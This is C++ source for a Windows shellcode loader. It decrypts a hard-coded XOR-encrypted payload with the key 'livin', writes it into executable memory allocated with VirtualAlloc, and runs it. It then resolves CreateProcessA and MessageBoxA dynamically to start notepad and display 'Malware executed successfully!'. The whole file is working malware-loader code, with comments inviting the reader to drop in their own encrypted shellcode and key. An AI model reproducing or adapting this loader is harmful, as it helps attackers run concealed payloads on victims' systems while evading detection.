#include <Windows.h>
#include <string>

// XOR encryption and decryption functions
std::string xor_encrypt(const std::string& shellcode, const std::string& key) {
    std::string encrypted;
    for (size_t i = 0; i < shellcode.size(); ++i) {
        encrypted += shellcode[i] ^ key[i % key.size()];
    }
    return encrypted;
}

std::string xor_decrypt(const std::string& encrypted, const std::string& key) {
    std::string shellcode;
    for (size_t i = 0; i < encrypted.size(); ++i) {
        shellcode += encrypted[i] ^ key[i % key.size()];
    }
    return shellcode;
}

int main() {
    // XOR encrypted shellcode
    std::string encrypted_shellcode = "\x90\x21\xf5\x8d\x9e\x84\xa9\x76\x69\x6e\x2d\x38\x37\x39\x3c\x3d\x3f\x3e\x58\xbc\x09\x21\xfd\x3b\x0e\x24\xe2\x24\x71\x26\xe7\x3b\x56\x21\xe5\x1e\x39\x3e\x66\xd9\x26\x23\x3b\x58\xa7\x24\x58\xb6\xc5\x52\x0d\x15\x74\x45\x4e\x2d\xa8\xbf\x64\x2f\x6d\xa8\x94\x84\x3c\x2d\x38\x3e\xe2\x3c\x4c\xe2\x34\x55\x26\x6d\xb9\xfd\xe9\xe6\x6c\x69\x76\x21\xeb\xac\x1d\x11\x21\x6f\xbc\x39\xfd\x21\x76\x28\xe2\x36\x49\x27\x6d\xb9\x95\x3f\x26\x93\xa0\x37\xe2\x5a\xe4\x21\x77\xbf\x23\x5d\xa0\x3e\x58\xae\xc0\x28\xb7\xa0\x63\x2d\x68\xb7\x51\x8e\x19\x98\x3a\x6a\x22\x48\x61\x33\x50\xbf\x19\xb1\x2e\x2d\xe5\x2c\x4d\x3f\x68\xbe\x0a\x28\xfd\x65\x26\x28\xe2\x36\x75\x27\x6d\xb9\x37\xe2\x6a\xe4\x21\x77\xb9\x2f\x34\x28\x2e\x37\x37\x36\x28\x2e\x28\x37\x2d\x33\x3e\xea\x82\x4c\x28\x24\x96\x8e\x34\x28\x2f\x33\x26\xe7\x7b\x9f\x3e\x91\x93\x96\x2b\x21\xd4\x6d\x69\x76\x69\x6e\x6c\x69\x76\x21\xe3\xe1\x68\x77\x69\x6e\x2d\xd3\x47\xe2\x01\xeb\x96\xa3\xd2\x8e\x71\x43\x7c\x28\xd4\xca\xfc\xcb\xf4\x91\xb9\x21\xf5\xad\x46\x50\x6f\x0a\x63\xee\x97\x89\x03\x6c\xd5\x2b\x7a\x04\x06\x04\x6c\x30\x37\xe0\xb4\x93\xbc\x15\x08\x02\x0f\x47\x13\x11\x0b\x6c"; // your encrypted shellcode here

    // XOR decryption key
    std::string key = "livin"; // your decryption key here

    // Decrypt the shellcode
    std::string shellcode = xor_decrypt(encrypted_shellcode, key);

    // Allocate memory for the shellcode
    LPVOID shellcode_ptr = VirtualAlloc(NULL, shellcode.size(), MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    // Copy the decrypted shellcode to the allocated memory
    memcpy(shellcode_ptr, shellcode.c_str(), shellcode.size());

    // Execute the shellcode
    ((void(*)())shellcode_ptr)();

    // Get the address of the CreateProcessA WINAPI
    typedef HANDLE(WINAPI* CreateProcessAPtr)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
    CreateProcessAPtr CreateProcessA_Ptr = (CreateProcessAPtr)GetProcAddress(GetModuleHandleA("kernel32"), "CreateProcessA");

    // Create a new process using the CreateProcessA pointer
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    CreateProcessA_Ptr(NULL, const_cast<char*>("C:\\Windows\\System32\\notepad.exe"), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);

    // Get the address of the MessageBoxA WINAPI
    typedef int (WINAPI* MessageBoxAPtr)(HWND, LPCSTR, LPCSTR, UINT);
    MessageBoxAPtr MessageBoxA_Ptr = (MessageBoxAPtr)GetProcAddress(GetModuleHandleA("user32"), "MessageBoxA");

    // Display a message box using the MessageBoxA pointer
    MessageBoxA_Ptr(NULL, "Malware executed successfully!", "Malware Alert", MB_OK);

    return 0;
}
